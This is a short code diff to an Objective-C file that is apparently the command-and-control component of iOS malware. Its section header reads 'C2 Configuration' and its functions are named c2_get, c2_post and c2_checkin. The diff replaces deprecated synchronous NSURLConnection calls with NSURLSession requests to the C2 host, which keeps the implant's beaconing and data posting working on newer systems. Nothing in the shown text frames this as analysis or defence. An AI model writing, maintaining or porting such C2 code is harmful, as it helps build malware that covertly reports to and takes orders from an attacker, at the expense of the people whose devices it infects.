@@ -1,4 +1,4 @@
-@import Foundation;
+#import <UIKit/UIKit.h>
 #include <unistd.h>
 
 #pragma mark - C2 Configuration
@@ -22,8 +22,14 @@ static NSData *c2_get(NSString *path) {
     NSString *url = [C2_HOST stringByAppendingString:path];
     NSURLRequest *req = [NSURLRequest requestWithURL:[NSURL URLWithString:url]
         cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
-    NSURLResponse *resp = nil; NSError *err = nil;
-    return [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:&err];
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    __block NSData *result = nil;
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+        result = data;
+        dispatch_semaphore_signal(sem);
+    }] resume];
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+    return result;
 }
 
 static NSData *c2_post(NSString *path, NSDictionary *body) {
@@ -36,8 +42,14 @@ static NSData *c2_post(NSString *path, NSDictionary *body) {
     [req setHTTPMethod:@"POST"];
     [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
     [req setHTTPBody:json];
-    NSURLResponse *resp = nil;
-    return [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:&e];
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    __block NSData *result = nil;
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+        result = data;
+        dispatch_semaphore_signal(sem);
+    }] resume];
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+    return result;
 }
 
 static void c2_checkin(void) {
